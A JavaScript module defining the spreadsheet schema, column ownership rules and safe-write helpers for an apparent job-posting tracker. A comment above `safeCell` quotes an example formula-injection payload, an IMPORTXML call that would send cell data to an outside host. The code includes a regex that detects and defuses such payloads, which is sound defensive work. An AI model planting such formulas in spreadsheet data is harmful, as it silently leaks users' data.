// SPDX-License-Identifier: GPL-3.0-or-later
// ---------------------------------------------------------------------------
// Sheet schema — the tabs, their columns, and what a blank one starts with.
//
// This is pure data. It describes what the spreadsheet should look like; the
// transport decides how to make it so. Keeping it separate means the shape of
// the workbook is testable without credentials, and the same definitions drive
// creation, validation, reading and the setup docs.
//
// ONE INVARIANT MATTERS MOST: on any tab the script writes to, user-owned
// columns come FIRST. Every script write then targets a single contiguous
// range starting to their right, which makes it structurally impossible to
// overwrite something a person typed — rather than merely something the code
// remembers not to do. `assertUserColumnsFirst` enforces it and the tests run
// it against every tab.
// ---------------------------------------------------------------------------

/** Column owners. Only `script` columns are ever written by a sync. */
export const USER = 'user';
export const SCRIPT = 'script';

const col = (key, header, owner, extra = {}) => ({ key, header, owner, ...extra });

// ---------------------------------------------------------------------------

export const TABS = {
  // -- what you're looking for ----------------------------------------------
  rules: {
    name: 'rules',
    purpose: 'What counts as a match. Every row is one rule.',
    frozenRows: 1,
    columns: [
      col('active', 'Active', USER, {
        width: 70,
        validation: { type: 'boolean' },
        help: 'Untick to turn a rule off without losing it. A blank counts as on.',
      }),
      col('kind', 'Kind', USER, {
        width: 110,
        validation: { type: 'list', values: ['title', 'body', 'exclude', 'title-hint'] },
        // Written out rather than abbreviated because this is the column
        // people ask about, and "gate for body rules" answers nobody who did
        // not already know. title-hint especially: on its own it finds
        // nothing, which is a surprising thing for a rule to do.
        help: [
          'What this rule does. Four kinds:',
          'title — look for this in the job title. The strongest signal.',
          'body — look for this in the job description. Weaker, because a posting can mention a tool in passing.',
          'exclude — never show a job whose title matches this, however well it scores otherwise.',
          'title-hint — a safety catch on your body rules: a body rule only counts if the title ALSO matches one of these. On its own it finds nothing. Leave them out entirely and body rules count on their own.',
        ].join('\n'),
      }),
      col('pattern', 'Pattern', USER, {
        width: 320,
        help: [
          'What to look for.',
          'A plain phrase matches whole words in order, so "staff engineer" does not match "Staff Software Engineer".',
          'Wrap it in slashes for a regular expression when you want a wider net: /staff.*engineer/',
          'Case never matters.',
        ].join('\n'),
      }),
      col('note', 'Note', USER, {
        width: 260,
        help: 'Yours to use however you like. Nothing reads it. A line on why you added a rule is worth having when you come back to it in a month.',
      }),
    ],
    seed: [
      { active: 'TRUE', kind: 'title', pattern: 'staff engineer', note: 'Example — edit or delete' },
      { active: 'FALSE', kind: 'exclude', pattern: 'intern', note: 'Example — set Active to TRUE to use' },
    ],
  },

  // -- where to look --------------------------------------------------------
  companies: {
    name: 'companies',
    purpose: 'Whose job boards to watch. Type a name and leave ATS/Slug blank — discovery fills them in.',
    frozenRows: 1,
    // Same left-to-right convention as `matches`: what you type, then what the
    // machine works out. Discovery writes ATS/Slug/Verified as targeted cells.
    columns: [
      col('active', 'Active', USER, {
        width: 70,
        validation: { type: 'boolean' },
        help: 'FALSE stops watching without losing the row.',
      }),
      col('name', 'Name', USER, { width: 180 }),
      col('category', 'Category', USER, { width: 130, help: 'Optional. Your own grouping.' }),
      col('note', 'Note', USER, { width: 240 }),
      col('ats', 'ATS', SCRIPT, {
        width: 130,
        validation: { type: 'list', values: ['greenhouse', 'lever', 'ashby', 'workable', 'smartrecruiters', 'recruitee'] },
        help: 'Leave blank and run discovery — it finds this for you.',
      }),
      col('slug', 'Slug', SCRIPT, { width: 160 }),
      col('verified', 'Verified', SCRIPT, { width: 80 }),
    ],
    seed: [
      // Not active. An example row that is switched on is a company that can
      // never resolve, so every discovery run spends thirty-six requests
      // failing to find a board for "Example Co" and reports it as a miss.
      { active: 'FALSE', name: 'Example Co — replace with a real company', note: 'Type a real name here, set Active to TRUE, leave ATS and Slug blank, then run "Find boards for new companies"' },
    ],
  },

  // -- what came back -------------------------------------------------------
  matches: {
    name: 'matches',
    purpose: 'Postings that matched. Status and Note are yours — the sync never writes to them.',
    frozenRows: 1,
    columns: [
      col('status', 'Status', USER, {
        width: 120,
        initial: 'Not reviewed',
        validation: { type: 'list', values: ['Not reviewed', 'Interested', 'Applied', 'Interviewing', 'Passed', 'Closed'] },
      }),
      col('note', 'Note', USER, { width: 220 }),
      col('score', 'Score', SCRIPT, { width: 70, format: 'number' }),
      col('company', 'Company', SCRIPT, { width: 150 }),
      col('title', 'Title', SCRIPT, { width: 300 }),
      col('salary', 'Salary', SCRIPT, { width: 130 }),
      col('location', 'Location', SCRIPT, { width: 170 }),
      col('posted', 'Posted', SCRIPT, { width: 110 }),
      col('age', 'Age', SCRIPT, { width: 90, help: 'Flags postings old enough to be stale.' }),
      col('matched', 'Matched', SCRIPT, { width: 240, help: 'Which rules fired.' }),
      // One band per posting: OTE where the posting states it, base otherwise.
      // Salary basis records which, so a figure that looks wrong can be traced
      // without re-running anything.
      col('salaryMin', 'Salary min', SCRIPT, { width: 100, format: 'number' }),
      col('salaryMax', 'Salary max', SCRIPT, { width: 100, format: 'number' }),
      col('salaryBasis', 'Salary basis', SCRIPT, {
        width: 190,
        help: 'Whether the figure is base or OTE, and how it was read.',
      }),
      col('firstSeen', 'First seen', SCRIPT, { width: 110 }),
      col('lastSeen', 'Last seen', SCRIPT, { width: 110, help: 'Stops advancing when a posting leaves the board.' }),
      col('url', 'URL', SCRIPT, { width: 260 }),
      col('key', 'Key', SCRIPT, {
        width: 200,
        help: 'Internal. Do not edit — this is how rows are matched up.',
        // Clearing this orphans the row: the posting comes back as a second
        // one while the original sits unchanging with your triage on it. It is
        // the only cell here where a stray delete costs work silently.
        protect: true,
      }),
      // Added after the first release. New columns go at the right edge so an
      // existing sheet can be upgraded by extending its header row, rather
      // than rebuilt — see planBootstrap.
      col('changed', 'Changed', SCRIPT, {
        width: 240,
        help: 'What moved since the last run. A salary going up on a live posting is worth knowing.',
      }),
      col('payRank', 'Pay rank', SCRIPT, {
        width: 110,
        help: 'Where this sits against every priced posting this watch has seen.',
      }),
    ],
    seed: [],
  },

  // -- what was filtered out ------------------------------------------------
  dropped: {
    name: 'dropped',
    purpose: 'Postings a filter cost you — matched a rule, then rejected on location, salary or an exclusion. Rewritten each run; read it when results feel thin.',
    frozenRows: 1,
    columns: [
      col('company', 'Company', SCRIPT, { width: 150 }),
      col('title', 'Title', SCRIPT, { width: 300 }),
      col('salary', 'Salary', SCRIPT, { width: 130 }),
      col('location', 'Location', SCRIPT, { width: 170 }),
      col('reason', 'Why dropped', SCRIPT, { width: 240 }),
      col('url', 'URL', SCRIPT, { width: 260 }),
    ],
    seed: [],
  },

  // -- a catalogue to pick from ---------------------------------------------
  directory: {
    name: 'directory',
    purpose: 'Companies that hire remotely. Set Add to TRUE and the watch starts following that company.',
    frozenRows: 1,
    // Add is the only cell here anyone types in, and it is leftmost, so
    // refreshing the catalogue can never reach it.
    columns: [
      col('add', 'Add', USER, {
        width: 60,
        validation: { type: 'boolean' },
        help: 'TRUE copies this company into the companies tab on the next run.',
      }),
      // The catalogue is shipped content the tool owns and refreshes, so
      // editing it here is work that gets overwritten and deleting a row is
      // undone on the next sync. Add is the only cell that means anything.
      col('name', 'Company', SCRIPT, { width: 190, protect: true }),
      col('description', 'What they do', SCRIPT, { width: 400, protect: true }),
      col('category', 'Category', SCRIPT, { width: 130, protect: true }),
      col('ats', 'ATS', SCRIPT, { width: 130, protect: true }),
      col('slug', 'Slug', SCRIPT, { width: 150, protect: true }),
    ],
    seed: [],
  },

  // -- what happened, and when ----------------------------------------------
  log: {
    name: 'log',
    purpose: 'Every run: when, what, how it went, and what it said. Nothing here is written by hand.',
    frozenRows: 1,
    columns: [
      col('when', 'When', SCRIPT, { width: 150, protect: true }),
      col('what', 'What ran', SCRIPT, { width: 110, protect: true }),
      col('outcome', 'Outcome', SCRIPT, { width: 90, protect: true }),
      col('summary', 'Summary', SCRIPT, { width: 420, protect: true }),
      // The full output. A diagnostic run's whole worth is what it printed,
      // and until this existed that went to a log on another website.
      col('detail', 'Detail', SCRIPT, {
        width: 600,
        protect: true,
        help: 'Everything the run printed. Click the cell to read it in the formula bar.',
      }),
    ],
    seed: [],
  },

  // -- settings -------------------------------------------------------------
  settings: {
    name: 'settings',
    purpose: 'Tuning. Blank means "use the default".',
    frozenRows: 1,
    keyValue: true,
    columns: [
      // The names and the help are the form; only the middle column is an
      // answer. Protecting the two means a settings row can be filled in but
      // not deleted or renamed into something the reader will never match.
      col('setting', 'Setting', USER, { width: 200, protect: true }),
      col('value', 'Value', USER, { width: 160 }),
      col('note', 'What it does', SCRIPT, { width: 460, protect: true }),
    ],
    // Each row carries its own type and key alongside the default and the help
    // text. `seedRow` only ever reads the column keys, so the extra fields
    // never reach the sheet — they let the reader parse a value and the
    // documentation describe it from one definition, which is the only way
    // the two stay in agreement.
    seed: [
      { setting: 'salary floor', key: 'salaryFloor', type: 'number', value: '',
        note: 'Drop anything below this. Compared against the top of the stated range. Blank = no salary filter.' },
      { setting: 'unpriced postings', key: 'unpriced', type: 'enum', options: ['keep', 'drop'], value: 'keep',
        note: 'keep · drop. What to do when no salary is stated.' },
      { setting: 'location mode', key: 'locationMode', type: 'enum', options: ['any', 'remote-only'], value: 'any',
        note: 'any · remote-only.' },
      { setting: 'location allowlist', key: 'locationAllowlist', type: 'list', value: '',
        note: 'Comma-separated, e.g. united states, usa, north america. Whole words, so "us" ' +
          'will not match Australia. A posting listing no country — plain "Remote" — always passes.' },
      { setting: 'close after days', key: 'closeAfterDays', type: 'number', value: '7',
        note: 'Mark a posting Closed once unseen this long. Rows you have triaged are left alone.' },
      { setting: 'stale posting days', key: 'stalePostingDays', type: 'number', value: '60',
        note: 'Flag postings older than this — long-open reqs are often not real.' },
      { setting: 'stale postings', key: 'stale', type: 'enum', options: ['keep', 'drop'], value: 'keep',
        note: 'keep · drop. What to do with a posting older than the day count above.' },
      { setting: 'weight: title match', key: 'weightTitle', type: 'number', weight: true, value: '40',
        note: 'Score contribution when a title rule fires.' },
      { setting: 'weight: salary headroom', key: 'weightSalary', type: 'number', weight: true, value: '25',
        note: 'Score contribution for clearing the floor comfortably.' },
      { setting: 'weight: seniority', key: 'weightSeniority', type: 'number', weight: true, value: '20',
        note: 'Score contribution when seniority matches your target.' },
      { setting: 'weight: freshness', key: 'weightFreshness', type: 'number', weight: true, value: '15',
        note: 'Score contribution for a recently posted role.' },
      { setting: 'seniority target', key: 'seniorityTarget', type: 'list', value: '',
        note: 'Comma-separated, e.g. director, vp, head of. Blank = no preference.' },
    ],
  },
};

export const TAB_NAMES = Object.keys(TABS);

/** The settings spec, keyed by the label as it appears in the sheet. */
export const SETTINGS = Object.fromEntries(
  TABS.settings.seed.map((s) => [s.setting, s])
);

/**
 * Settings that used to exist. A sheet is never rewritten, so a row for a
 * retired setting outlives the version that used it — and "unknown setting"
 * is a confusing thing to be told about a row you were once instructed to
 * fill in. Name them, and say what to do.
 */
export const RETIRED_SETTINGS = {
  'salary basis': 'salary is now a single band — the OTE where a posting states one, ' +
    'the base otherwise — so there is nothing left to choose between. Safe to delete this row.',
};

/** Rule kinds, and which compiled list each feeds. */
export const RULE_KINDS = {
  title: 'title',
  body: 'body',
  exclude: 'exclude',
  'title-hint': 'bodyRequiresTitleHint',
};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** 0-based column index to spreadsheet letter (0 → A, 26 → AA). */
export function colLetter(i) {
  let s = '';
  for (let n = i; n >= 0; n = Math.floor(n / 26) - 1) {
    s = String.fromCharCode((n % 26) + 65) + s;
  }
  return s;
}

/**
 * The only three things anything may do to a spreadsheet.
 *
 * A contract about the sheet rather than about any one way of reaching it, so
 * it lives here — every backend refuses anything else by name, and a plan
 * carrying a fourth operation is a bug in the planner rather than a feature
 * request.
 */
export const SUPPORTED_OPS = ['addTab', 'writeRange', 'formatTab'];

export const headers = (tab) => tab.columns.map((c) => c.header);

/**
 * How many body rows are really in use.
 *
 * Not `rows.length`. A column carrying a checkbox displays FALSE on every row
 * of the grid, including the nine hundred nobody has touched, so a read comes
 * back full of rows that look occupied and are not. Appending after them put
 * the whole catalogue at row 1001 of an apparently empty tab — which is how
 * this was found, by someone scrolling.
 *
 * `keyIndex` names a column that is always filled when a row is real: the
 * company name, the rule's pattern. Everything after the last of those is
 * grid, not data.
 */
/**
 * A value that cannot become a formula when it lands in a cell.
 *
 * Everything on the matches tab is text somebody else wrote: a job title, a
 * location, a company name, all lifted from a public job board. `setValues`
 * evaluates a string beginning `=` as a formula, so a posting titled
 * `=IMPORTXML("https://…"&A1,"//a")` becomes a live formula in the sheet of
 * whoever watched that board — and IMPORTXML fetches on its own, with no click,
 * carrying whatever it was pointed at. Nothing here ever writes a formula on
 * purpose, so a leading formula character is always someone else's idea.
 *
 * The apostrophe is Sheets' own force-to-text prefix: it is consumed on the way
 * in and does not come back out on a read, so a guarded value still compares
 * equal to the posting it came from and no row reports a change it did not
 * make.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

export function safeCell(value) {
  const text = String(value ?? '');
  if (!FORMULA_LEAD.test(text)) return text;
  // A negative number is a number. Quoting it would turn a salary floor into
  // text and break every comparison downstream.
  if (text.trim() !== '' && Number.isFinite(Number(text))) return text;
  return `'${text}`;
}

/** The same, over a grid — what every write to a real sheet goes through. */
export function safeValues(rows = []) {
  return (rows || []).map((row) => (row || []).map(safeCell));
}

export function usedRows(bodyRows = [], keyIndex = 0) {
  let last = 0;
  bodyRows.forEach((row, i) => {
    if (String((row && row[keyIndex]) ?? '').trim()) last = i + 1;
  });
  return last;
}

/**
 * Columns worth warning someone away from, as contiguous blocks.
 *
 * Warning-only, always: on a sheet you own, protection cannot stop you, and
 * pretending otherwise would be worse than useless. What it does stop is the
 * accident — a select-all-delete, a stray paste — and anyone the sheet is
 * shared with.
 */
export function protectedBlocks(tab) {
  const blocks = [];
  let start = null;
  tab.columns.forEach((c, i) => {
    if (c.protect && start === null) start = i;
    if ((!c.protect || i === tab.columns.length - 1) && start !== null) {
      const end = c.protect ? i : i - 1;
      blocks.push({ start, end, headers: tab.columns.slice(start, end + 1).map((x) => x.header) });
      start = null;
    }
  });
  return blocks;
}
export const userColumns = (tab) => tab.columns.filter((c) => c.owner === USER);
export const scriptColumns = (tab) => tab.columns.filter((c) => c.owner === SCRIPT);
export const columnIndex = (tab, key) => tab.columns.findIndex((c) => c.key === key);

/**
 * The range a sync may write on this tab: everything from the first
 * script-owned column rightwards. Returns null when a tab has no script
 * columns, or when they aren't contiguous at the right edge — which would mean
 * the invariant is broken and no safe range exists.
 */
export function scriptRange(tab, row) {
  const first = tab.columns.findIndex((c) => c.owner === SCRIPT);
  if (first === -1) return null;
  const trailing = tab.columns.slice(first);
  if (trailing.some((c) => c.owner === USER)) return null;
  return `${tab.name}!${colLetter(first)}${row}:${colLetter(tab.columns.length - 1)}${row}`;
}

/**
 * The range to read a tab back through.
 *
 * Deliberately wider than the schema: reading exactly the declared number of
 * columns means one column inserted by a user pushes the last one — Key, on
 * the matches tab — outside the read, and every row then looks keyless. A
 * sheet created here starts with 26 columns, so Z is both safe to ask for and
 * roomy enough for anything short of deliberate sabotage.
 */
export function readRange(tab, fromRow = 1) {
  const width = Math.max(tab.columns.length, 26);
  return `${tab.name}!A${fromRow}:${colLetter(width - 1)}`;
}

/**
 * Where a sync may write on this tab, worked out from the sheet's ACTUAL
 * header row rather than from the schema's column order.
 *
 * The two can differ, and when they do the difference is destructive. Reads
 * locate columns by header name; if writes used schema positions, inserting a
 * single column would leave them pointing at different cells, and the sync
 * would overwrite whatever the user put there. The invariant is meant to make
 * that impossible, not merely unlikely, so the write range is derived from the
 * same source the reads are.
 *
 * Returns `{ range, keys }` on success, or `{ problem }` when no safe write
 * exists — a script column missing from the header, or a user column sitting
 * inside the block. Refusing beats writing to the wrong place.
 *
 * @param header the sheet's first row, as read back. Empty falls back to the
 *        schema order, which is correct for a tab this code just created.
 */
export function resolveWriteRange(tab, header = [], row = 1) {
  const seen = (header || []).map((h) => String(h ?? '').trim().toLowerCase());
  if (!seen.length) {
    const range = scriptRange(tab, row);
    return range
      ? { range, keys: scriptColumns(tab).map((c) => c.key) }
      : { problem: `${tab.name}: no script-owned columns` };
  }

  const scripts = scriptColumns(tab);
  const positions = [];
  for (const col of scripts) {
    const at = seen.indexOf(col.header.toLowerCase());
    if (at === -1) {
      return {
        problem: `${tab.name}: the sheet has no "${col.header}" column. ` +
          `Restore the heading or re-run setup — writing without it would put values in the wrong cells.`,
      };
    }
    positions.push({ key: col.key, at });
  }

  positions.sort((a, b) => a.at - b.at);
  const first = positions[0].at;
  const last = positions.at(-1).at;

  // Nothing user-owned may sit inside the block. Checked before the gap test
  // because both are true at once and this message is the actionable one.
  const userHeaders = new Set(userColumns(tab).map((c) => c.header.toLowerCase()));
  for (let i = first; i <= last; i++) {
    if (userHeaders.has(seen[i])) {
      return {
        problem: `${tab.name}: "${header[i]}" is yours but sits inside the range this writes to. ` +
          `Move it left of "${scripts[0].header}" and it will be left alone.`,
      };
    }
  }

  // Contiguous, or a single write would span cells belonging to someone else.
  if (last - first + 1 !== positions.length) {
    const gaps = [];
    for (let i = first; i <= last; i++) {
      if (!positions.some((p) => p.at === i)) gaps.push(header[i] || `column ${colLetter(i)}`);
    }
    return {
      problem: `${tab.name}: "${gaps.join('", "')}" sits between the columns this writes to. ` +
        `Move it left of "${scripts[0].header}" and it will be left alone.`,
    };
  }

  return {
    range: `${tab.name}!${colLetter(first)}${row}:${colLetter(last)}${row}`,
    keys: positions.map((p) => p.key),
  };
}

/** A full row in the order the SHEET has its columns, not the schema's. */
export function rowInSheetOrder(tab, header, values) {
  const seen = (header || []).map((h) => String(h ?? '').trim().toLowerCase());
  if (!seen.length) return tab.columns.map((c) => String(values[c.key] ?? ''));

  const out = new Array(seen.length).fill('');
  for (const col of tab.columns) {
    const at = seen.indexOf(col.header.toLowerCase());
    if (at !== -1) out[at] = String(values[col.key] ?? '');
  }
  return out;
}

/**
 * Throws if any tab interleaves user columns among script ones. Called by the
 * tests; a violation means a sync could clobber someone's typing.
 */
export function assertUserColumnsFirst() {
  for (const tab of Object.values(TABS)) {
    const owners = tab.columns.map((c) => c.owner);
    const firstScript = owners.indexOf(SCRIPT);
    if (firstScript === -1) continue;
    const offender = owners.slice(firstScript).indexOf(USER);
    if (offender !== -1) {
      const c = tab.columns[firstScript + offender];
      throw new Error(
        `${tab.name}: user column "${c.header}" sits right of a script column — ` +
        `a sync write would overwrite it. Move all user columns to the left.`
      );
    }
  }
  return true;
}

/** Turns a seed object into a row array in column order. */
export function seedRow(tab, seed) {
  return tab.columns.map((c) => String(seed[c.key] ?? ''));
}
